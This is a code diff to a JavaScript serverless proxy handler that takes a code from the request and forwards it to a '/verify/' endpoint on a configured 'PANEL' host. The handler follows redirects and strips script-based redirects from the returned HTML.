@@ -5,43 +5,30 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
+    // 1. Clean up the path
     path = path.replace(/^\/api\/proxy/, '');
     if (!path.startsWith('/')) path = '/' + path;
 
     const parts = path.split('/').filter(Boolean);
     let code = '';
-    
-    // Try to grab the code from the URL (e.g. /random/CODE)
-    if (parts.length >= 2 && parts[1].length > 4) {
+
+    // 2. Extract the code (Check query first for POST, then URL path)
+    if (req.query && req.query.code) {
+        code = req.query.code;
+    } else if (parts.length >= 2 && parts[1].length > 4) {
         code = parts[1];
     } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'verify') {
         code = parts[0];
     }
 
-    // If it's a POST from the form (submitting to root), we need the code from the form body
-    if (req.method === 'POST' && !code && req.body) {
-        // If they submitted to the root, the body has the code (or we check the Referer URL)
-        const referer = req.headers['referer'] || '';
-        const refParts = referer.split('/').filter(Boolean);
-        if (refParts.length > 0) code = refParts[refParts.length - 1];
-    }
-
     if (!code) {
-        // If we still don't have a code, we can't proceed
         context.res = { status: 400, body: "Missing code." };
         return;
     }
 
-    // 1. Define the target URL
+    // 3. Define the target URL
     let targetPath = `/verify/${code}`;
-    
-    // 2. If it's a POST, we forward the POST to /verify/CODE to trigger the CAPTCHA pass
-    // If it's a GET, we fetch the page (either the CAPTCHA or the final template)
     let currentUrl = `https://${PANEL}${targetPath}`;
-    
-    if (req.query && Object.keys(req.query).length > 0) {
-        currentUrl += '?' + new URLSearchParams(req.query).toString();
-    }
 
     context.log(`Forwarding ${req.method} to: ${currentUrl}`);
 
@@ -63,7 +50,7 @@ module.exports = async function (context, req) {
     try {
         let r;
 
-        // 3. Follow server-side redirects
+        // 4. Follow server-side redirects
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -85,8 +72,8 @@ module.exports = async function (context, req) {
         let responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
-        // 4. Clean up the HTML
         if (contentType.includes('text/html')) {
+            // Strip JS redirects
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                     return ''; 
